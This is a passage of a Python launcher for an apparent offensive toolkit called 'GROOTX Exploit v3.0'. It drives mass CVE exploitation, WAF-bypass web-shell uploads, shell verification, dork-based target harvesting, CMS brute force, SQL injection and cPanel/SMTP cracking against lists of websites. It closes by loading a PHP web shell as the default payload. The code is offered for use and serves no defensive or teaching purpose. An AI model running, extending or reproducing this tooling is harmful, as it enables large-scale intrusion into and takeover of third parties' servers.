    """CVE Mass Exploitation — auto exploit semua CVE."""
    print(f"\n[GROOTX] CVE MASS EXPLOITATION (12 CVEs, auto)")
    check_deps()
    if not ensure_list():
        return
    print(f"[GROOTX] Targets: {len(get_targets())} | Mode: AUTO (all CVEs)")
    subprocess.run(
        ["python3", os.path.join(GROOTX_DIR, "blast_exploit.py"), "--direct", "--threads", str(THREADS)],
        capture_output=False
    )

def cmd_auto():
    """AUTO EXPLOIT — WAF bypass zero-day upload via exploit pipeline."""
    print(f"\n[GROOTX] AUTO EXPLOIT — WAF BYPASS ZERO-DAY UPLOAD")
    print(f"[GROOTX] Exploit → RCE deploy → WAF bypass upload")
    print(f"[GROOTX] Local Shell: {LOCAL_PAYLOAD_PATH}")
    check_deps()
    if not ensure_list():
        return
    print(f"[GROOTX] Targets: {len(get_targets())} | WAF BYPASS UPLOAD: ON")
    subprocess.run(
        ["python3", os.path.join(GROOTX_DIR, "blast_exploit.py"), "--direct", "--upload", "--threads", str(THREADS)],
        capture_output=False
    )
    subprocess.run(
        ["python3", os.path.join(GROOTX_DIR, "shell_manager_v2.py"), "verify"],
        capture_output=False
    )

def cmd_zeroday():
    """ZERO-DAY ATTACK — WAF bypass zero-day upload via exploit pipeline."""
    print(f"\n{'='*60}")
    print(f"[GROOTX] ZERO-DAY ATTACK — WAF BYPASS UPLOAD")
    print(f"[GROOTX] Exploit → RCE deploy → WAF bypass upload")
    print(f"{'='*60}")
    check_deps()
    if not ensure_list():
        return
    print(f"[GROOTX] Targets: {len(get_targets())} | WAF BYPASS: ON")
    subprocess.run(
        ["python3", os.path.join(GROOTX_DIR, "blast_exploit.py"), "--direct", "--zero-day", "--upload", "--threads", str(THREADS)],
        capture_output=False
    )
    subprocess.run(
        ["python3", os.path.join(GROOTX_DIR, "shell_manager_v2.py"), "verify"],
        capture_output=False
    )
    subprocess.run(
        ["python3", os.path.join(GROOTX_DIR, "shell_manager_v2.py"), "retry"],
        capture_output=False
    )

def cmd_reverseip():
    """Reverse IP + Shell Checker."""
    print(f"\n[GROOTX] REVERSE IP & SHELL CHECKER")
    check_deps()
    if not ensure_list():
        return
    subprocess.run(
        ["python3", os.path.join(GROOTX_DIR, "target_grabber.py"), "-l", LIST_FILE, "--mode", "all"],
        capture_output=False
    )

def cmd_blast():
    """BLAST EXPLOIT — WAF bypass zero-day, mass upload via exploit pipeline."""
    print(f"\n[GROOTX] BLAST EXPLOIT — WAF BYPASS ZERO-DAY UPLOAD")
    print("[GROOTX] Exploit → RCE deploy → WAF bypass upload")
    check_deps()
    if not ensure_list():
        return
    print(f"[GROOTX] Targets: {len(get_targets())} | WAF BYPASS UPLOAD: ON")
    subprocess.run(
        ["python3", os.path.join(GROOTX_DIR, "blast_exploit.py"), "--direct", "--upload", "--threads", str(THREADS)],
        capture_output=False
    )
    subprocess.run(
        ["python3", os.path.join(GROOTX_DIR, "shell_manager_v2.py"), "verify"],
        capture_output=False
    )

def cmd_direct():
    """Direct Mass Exploit — WAF bypass zero-day upload via exploit pipeline."""
    print(f"\n[GROOTX] DIRECT MASS EXPLOIT — WAF BYPASS ZERO-DAY UPLOAD")
    print("[GROOTX] Exploit → RCE deploy → WAF bypass upload")
    check_deps()
    if not ensure_list():
        return
    print(f"[GROOTX] Targets: {len(get_targets())} | WAF BYPASS UPLOAD: ON")
    subprocess.run(
        ["python3", os.path.join(GROOTX_DIR, "blast_exploit.py"), "--direct", "--upload", "--threads", str(THREADS)],
        capture_output=False
    )
    subprocess.run(
        ["python3", os.path.join(GROOTX_DIR, "shell_manager_v2.py"), "verify"],
        capture_output=False
    )

def cmd_help():
    """Show help."""
    parser = argparse.ArgumentParser(
        description="GROOTX Exploit v3.0 - Deep Web Exploitation Suite",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
ZERO-DAY ATTACK:
  python3 hek.py zeroday       Zero-day attack — agresif exploit tanpa fingerprint
  python3 hek.py auto          Auto exploit — semua CVE methods ke semua target
  python3 hek.py blast         BLAST — dedicated mass exploit tanpa scan
  python3 hek.py direct        Direct blast — mass exploit semua CVE tanpa scan

PER-CVE SELECTION:
  python3 hek.py cve-select    Pilih CVE spesifik untuk di-exploit

TARGET GRABBER (dork search):
  python3 hek.py grab          Cari target via CVE dork (ketik domain, isi list.txt)
  python3 hek.py grab-exploit  Grab target lalu langsung full pipeline
  python3 hek.py cvedorks      Lihat daftar dork CVE-specific

PIPELINE:
  python3 hek.py run           Full pipeline (scan + exploit + shell + root + verify)
  python3 hek.py quick         Quick exploit
  python3 hek.py wp            WordPress mass exploit
  python3 hek.py wiki          MediaWiki exploit
  python3 hek.py validate      Validate shells
  python3 hek.py verify        Verify shells
  python3 hek.py dorks         Export dorks
  python3 hek.py stats         Show statistics
  python3 hek.py setup         Setup
  python3 hek.py continuous    Continuous mode
  python3 hek.py payload       Manage local payloads
  python3 hek.py deploy        Deploy payloads to targets
  python3 hek.py list          List local payload paths
  python3 hek.py psft          PeopleSoft CVE-2026-35273 exploit
  python3 hek.py bruteforce    CMS Brute Force
  python3 hek.py detect        CMS Detection
  python3 hek.py cve           CVE Mass Exploitation (19 CVEs)
  python3 hek.py reverseip     Reverse IP + Shell Checker
  python3 hek.py sqli          SQLI Injector + Zone-h Grabber
  python3 hek.py smtp          SMTP Cracker + cPanel Cracker + Mass Shell Upload
  ./run.sh                     Interactive menu
        """
    )
    parser.add_argument("command", nargs="?", default="help",
                       help="Command to execute")
    args = parser.parse_args()
    parser.print_help()

def main():
    parser = argparse.ArgumentParser(
        description="GROOTX Exploit v3.0 - Deep Web Exploitation Suite",
        add_help=False
    )
    parser.add_argument("command", nargs="?", default="help")
    args = parser.parse_args()
    
    commands = {
        "run": cmd_run, "full": cmd_run,
        "quick": cmd_quick,
        "zeroday": cmd_zeroday,
        "zd": cmd_zeroday,
        "wp": cmd_wp,
        "wiki": cmd_wiki,
        "validate": cmd_validate,
        "verify": cmd_verify,
        "retry": cmd_retry,
        "dorks": cmd_dorks,
        "stats": cmd_stats,
        "setup": cmd_setup,
        "continuous": cmd_continuous,
        "payload": cmd_payload,
        "upload": cmd_upload,
        "deploy": cmd_deploy,
        "list": cmd_list,
        "psft": cmd_psft,
        "peoplesoft": cmd_psft,
        "psft-dorks": cmd_psft_dorks,
        "psft-verify": cmd_psft_verify,
        "psft-continuous": cmd_psft_continuous,
        "grab": cmd_grab,
        "grabber": cmd_grab,
        "search": cmd_grab,
        "grab-exploit": cmd_grab_exploit,
        "grabblast": cmd_grab_exploit,
        "dorks-cve": cmd_dorks_cve,
        "cvedorks": cmd_dorks_cve,
        "bruteforce": cmd_bruteforce,
        "bf": cmd_bruteforce,
        "detect": cmd_detect,
        "cms": cmd_detect,
        "cve": cmd_cve,
        "cve-select": cmd_cve_select,
        "cvsel": cmd_cve_select,
        "blast": cmd_blast,
        "direct": cmd_direct,
        "reverseip": cmd_reverseip,
        "reverse-ip": cmd_reverseip,
        "shellcheck": cmd_reverseip,
        "sqli": cmd_sqli,
        "zoneh": cmd_sqli,
        "smtp": cmd_smtp,
        "cpanel": cmd_smtp,
        "shellupload": cmd_upload,
        "help": cmd_help,
        "h": cmd_help,
    }
    
    cmd = args.command
    if cmd in commands:
        commands[cmd]()
    elif cmd is None or cmd == "help":
        cmd_help()
    else:
        print(f"[GROOTX][ERROR] Unknown command: {cmd}")
        print("Run 'python3 GROOTX.py help' for available commands.")

if __name__ == "__main__":
    main()
def get_default_shell():
    "Default shell payload - VANTA SHELL"
    return open(os.path.expanduser("~/vanta-shell.php")).read()
